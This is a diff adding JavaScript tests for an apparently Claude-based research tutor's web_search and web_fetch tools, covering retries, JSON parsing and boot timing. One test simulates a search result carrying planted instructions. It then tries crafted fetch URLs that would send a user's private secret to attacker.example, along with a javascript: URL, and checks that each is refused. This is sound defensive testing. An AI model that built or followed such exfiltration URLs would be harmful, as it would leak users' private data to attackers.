@@ -10,7 +10,7 @@ import { readFileSync } from 'node:fs';
 const src = (f) => readFileSync(new URL('../app/src/js/' + f, import.meta.url), 'utf8');
 
 function boot({ mcp = null, sample = null } = {}) {
-  const ctx = vm.createContext({ console, setTimeout, clearTimeout, crypto: globalThis.crypto });
+  const ctx = vm.createContext({ console, setTimeout, clearTimeout, crypto: globalThis.crypto, URL });
   vm.runInContext('var window = globalThis;', ctx);
   for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
   const U = ctx.U;
@@ -184,4 +184,160 @@ test('research tools: rate limits, failures and connector errors that arrive as 
   await s2.execute({ objective: 'o', search_queries: ['a'] });
   for (let i = 0; i < 4; i++) assert.match(await f2.execute({ urls: ['https://example.org/page-0'] }), /^Tool error \(tool_error\)/);
   assert.match(await f2.execute({ urls: ['https://example.org/page-0'] }), /^Tool error \(unavailable\)/);
+});
+
+// ---------- audit round 3 ----------
+
+test('web_fetch checks and sends the parsed addresses: crafted ones are refused, real ones with ")" open (audit 1)', async () => {
+  const WIKI = 'https://en.wikipedia.org/wiki/Pendulum_(mechanics)';
+  const mcp = fakeMcp({
+    web_search: () => ({ results: [
+      { url: 'https://attacker.example/pendulum-facts', title: 'Pendulum facts', excerpts: ['planted instructions'] },
+      { url: WIKI, title: 'Pendulum (mechanics)', excerpts: ['For small swings…'] },
+      { url: 'https://www.nasa.gov/pendulum', title: 'NASA', excerpts: ['x'] },
+    ] }),
+    web_fetch: (inp) => ({ results: inp.urls.map((u) => ({ url: u, excerpts: ['page text'] })) }),
+  });
+  const U = boot({ mcp });
+  const [search, fetch] = await U.research.tools();
+  await search.execute({ objective: 'pendulum period', search_queries: ['pendulum period length'] });
+  const secret = encodeURIComponent('I failed this at school');
+  const crafted = [
+    ['https://attacker.example/pendulum-facts)?q=' + secret],
+    ['https://attacker.example/pendulum-facts\\?q=' + secret],
+    ['https://attacker.example/pendulum-facts]?q=' + secret],
+    ['https://www.nasa.gov/pendulum', 'https:/attacker.example/log?q=SECRET'],
+    ['https://www.nasa.gov/pendulum', '//attacker.example/log?q=SECRET'],
+    ['https://www.nasa.gov/pendulum', 'attacker.example/log?q=SECRET'],
+    ['https://user:pw@www.nasa.gov/pendulum'],
+    ['javascript:alert(1)//https://www.nasa.gov/pendulum'],
+  ];
+  for (const urls of crafted) assert.match(await fetch.execute({ urls }), /^Tool error \(refused\): /, JSON.stringify(urls));
+  assert.equal(mcp.calls.filter((c) => c.tool === 'web_fetch').length, 0, 'no crafted address reaches the connector');
+
+  // A real result whose address has brackets opens, and what is sent is the parsed address only,
+  // with no argument that could name another page.
+  const ok = await fetch.execute({ urls: [WIKI, 'HTTPS://EN.WIKIPEDIA.ORG/wiki/Pendulum_(mechanics)/#history'], objective: 'period', full_content: true, url: 'https://attacker.example/x', extra: { u: 'https://attacker.example/y' } });
+  assert.ok(!/^Tool error/.test(ok), ok);
+  const sent = mcp.calls.filter((c) => c.tool === 'web_fetch')[0].input;
+  assert.deepEqual(sent.urls, [WIKI, 'https://en.wikipedia.org/wiki/Pendulum_(mechanics)/#history']);
+  assert.equal(sent.objective, 'period');
+  assert.equal(sent.full_content, true);
+  assert.equal(sent.session_id, U.research.SESSION);
+  assert.deepEqual(Object.keys(sent).sort(), ['full_content', 'objective', 'session_id', 'urls']);
+
+  // The lesson's own sources (opts.allow) are compared the same way.
+  const [, tutorFetch] = await U.research.tools(null, { allow: [WIKI] });
+  assert.ok(!/^Tool error/.test(await tutorFetch.execute({ urls: [WIKI] })), 'a source with ")" can be reopened');
+  assert.match(await tutorFetch.execute({ urls: [WIKI + ')?q=x'] }), /^Tool error \(refused\): /);
+  assert.match(await tutorFetch.execute({ urls: 'not a list' }), /^Tool error \(refused\): /);
+  assert.match(await tutorFetch.execute({}), /^Tool error \(bad_request\): /);
+});
+
+test('ask: every call to Claude starts with the tools\' whole budget, retries included (audit 25)', async () => {
+  let n = 0;
+  const mcp = fakeMcp({ web_search: () => ({ results: [{ url: 'https://example.edu/p' + (n++), title: 't', excerpts: ['text'] }] }), web_fetch: () => ({ results: [] }) });
+  let attempt = 0;
+  const log = [];
+  const U = boot({ mcp, sample: async (input, o) => {
+    attempt++;
+    const search = o.tools.find((t) => t.name === 'web_search');
+    for (let i = 0; i < (attempt === 1 ? 9 : 4); i++) log.push(attempt + ':' + (/^Tool error/.test(String(await search.execute({ objective: 'x', search_queries: ['a b c'] }))) ? 'error' : 'ok'));
+    if (attempt === 1) throw { code: 'upstream_error', message: 'connection reset' };
+    return { text: '{"ok":true}', truncated: false };
+  } });
+  U.sleep = () => Promise.resolve();
+  const tools = await U.research.tools(null, {});
+  assert.deepEqual(plainObj(await U.ask('TASK: research', { json: true, tools, priority: 'background' })), { ok: true });
+  assert.deepEqual(log.slice(9), ['2:ok', '2:ok', '2:ok', '2:ok'], 'the retry is not told the budget is spent');
+  assert.equal(typeof tools.reset, 'function');
+});
+
+const plainObj = (x) => JSON.parse(JSON.stringify(x));
+
+test('parseJson: the answer after narration from earlier tool rounds, brackets and all (audit 26)', () => {
+  const U = boot();
+  const json = '{"sources":[{"n":1,"title":"Tides","url":"https://oceanservice.noaa.gov/facts/springtide.html","quote":"Spring tides occur when the sun and moon are aligned."}],"topic":{"notes":[]},"ideas":{}}';
+  const cases = {
+    'final JSON only': json,
+    'narration, then JSON': "I'll start with a broad search.\n\nThe NOAA results look strong.\n\n" + json,
+    'narration with [1], then JSON': 'The NOAA page says spring tides happen at new and full moon [1]. Let me fetch it.\n\n' + json,
+    'narration with {objective}, then JSON': 'Next I will search with {objective: tides}.\n\n' + json,
+    'a draft object, then the answer': 'Draft: {"sources":[]}\n\nMore searching.\n\n' + json,
+    'fenced after prose, then a footnote': 'Here it is:\n```json\n' + json + '\n```\nSee [1].',
+    'narration with a stray quote in braces': 'Searching {objective: "tides} now.\n\n' + json,
+    'narration with an object inside junk': 'Next {objective: {"a":1}} then.\n\n' + json,
+    'narration with an unclosed brace': 'I will use {objective here\n\n' + json,
+    'a note in braces after the answer': json + '\n\nSee {note}.',
+  };
+  for (const [name, text] of Object.entries(cases)) assert.equal(U.parseJson(text).sources.length, 1, name);
+  assert.deepEqual(plainObj(U.parseJson('Only a list: [1, 2]')), [1, 2], 'an array when there is no object');
+  assert.throws(() => U.parseJson('no json here'), (e) => e.code === 'bad_json' && /did not reply/.test(e.message));
+  assert.throws(() => U.parseJson('{"a": 1,}'), (e) => e.code === 'bad_json' && /could not be read/.test(e.message));
+  // A broken answer is reported as broken, not answered with a piece of it or with narration.
+  const unread = (e) => e.code === 'bad_json' && /could not be read/.test(e.message);
+  assert.throws(() => U.parseJson('{"sources":[{"n":1,"title":"T"}],"topic":{"notes":[],},"ideas":{}}'), unread);
+  assert.throws(() => U.parseJson('It says so [1].\n\n{"sources":[{"n":1}],"x":1,}'), unread);
+});
+
+test('toolsOk: page tools only where sample.limits() reports them; tools_unavailable settles it (audit 5)', async () => {
+  const plain = async () => ({ text: 'ok', truncated: false });
+  const mk = (limits) => Object.assign((input, o) => (o.tools ? Promise.reject({ code: 'tools_unavailable', message: 'no tools here' }) : plain()), limits ? { limits } : {});
+  assert.equal(await boot({ sample: mk(() => Promise.resolve({ maxPromptBytes: 262144, tools: { maxCount: 20 } })) }).rt.toolsOk(), true);
+  assert.equal(await boot({ sample: mk(() => Promise.resolve({ maxPromptBytes: 262144, images: {} })) }).rt.toolsOk(), false, 'no tools member');
+  assert.equal(await boot({ sample: mk(() => Promise.reject({ code: 'x' })) }).rt.toolsOk(), false, 'limits() failing counts as no');
+  assert.equal(await boot({ sample: null }).rt.toolsOk(), false, 'no sample at all');
+  const U = boot({ sample: mk(null) });
+  assert.equal(await U.rt.toolsOk(), true, 'no limits(): the benefit of the doubt');
+  await assert.rejects(U.ask('x', { tools: [{ name: 't', description: 'd', execute: () => '' }] }), (e) => e.code === 'tools_unavailable');
+  assert.equal(await U.rt.toolsOk(), false, 'one tools_unavailable answers it for the visit');
+});
+
+// A VM whose clock runs 100 times fast, with a claude.use() that answers each name after `ms`
+// (real milliseconds; null = never).
+function bootSlow(delays, idMs = 0) {
+  const fast = (f, ms, ...a) => setTimeout(f, (ms || 0) / 100, ...a);
+  const ctx = vm.createContext({ console, setTimeout: fast, clearTimeout, crypto: globalThis.crypto, URL });
+  vm.runInContext('var window = globalThis;', ctx);
+  const user = { id: () => new Promise((r) => setTimeout(() => r('u_dan'), idMs)) };
+  const ns = { db: { doc() {} }, user, sample: () => Promise.resolve({ text: '' }), mcp: null, downloads: null, permissions: null };
+  ctx.claude = { use: (name) => new Promise((r) => { const ms = name in delays ? delays[name] : 1; if (ms !== null) setTimeout(() => r(ns[name]), ms); }) };
+  for (const f of ['00-core.js', '10-runtime.js']) vm.runInContext(src(f), ctx, { filename: f });
+  return ctx.U;
+}
+
+test('boot waits up to 30 s for saved work, and takes up whatever arrives later (audit 14)', async () => {
+  // db answers at "15 s" (150 ms real): past the old 10 s guard, so it was dropped for the visit.
+  let U = bootSlow({ db: 150 });
+  await U.rt.ready;
+  assert.ok(U.rt.db && U.rt.user && U.rt.uid === 'u_dan', 'a slow db is waited for');
+  assert.deepEqual(plainObj(U.rt.late), []);
+
+  // db answers at "45 s": boot goes on at 30 s without it, says what is still coming, and takes it up when it comes.
+  U = bootSlow({ db: 450 });
+  const t0 = Date.now();
+  await U.rt.ready;
+  assert.ok(Date.now() - t0 < 400, 'boot did not wait for ever');
+  assert.equal(U.rt.db, null);
+  assert.deepEqual(plainObj(U.rt.late), ['db']);
+  const arrived = await new Promise((r) => U.on('rt-late', r));
+  assert.equal(arrived, 'db');
+  assert.ok(U.rt.db, 'taken up when it arrives');
+  assert.deepEqual(plainObj(U.rt.late), []);
+
+  // The user capability late: its id is asked for then, and 'uid' is announced too.
+  U = bootSlow({ user: 450 });
+  await U.rt.ready;
+  assert.deepEqual(plainObj(U.rt.late), ['user']);
+  const seen = [];
+  await new Promise((r) => U.on('rt-late', (n) => { seen.push(n); if (n === 'uid') r(); }));
+  assert.deepEqual(seen, ['user', 'uid']);
+  assert.equal(U.rt.uid, 'u_dan');
+
+  // Something optional that never answers still only holds boot for 10 s.
+  U = bootSlow({ mcp: null });
+  const t1 = Date.now();
+  await U.rt.ready;
+  assert.ok(Date.now() - t1 < 250 && U.rt.db && U.rt.uid === 'u_dan', 'mcp gave up at 10 s, saved work in');
+  assert.deepEqual(plainObj(U.rt.late), ['mcp']);
 });
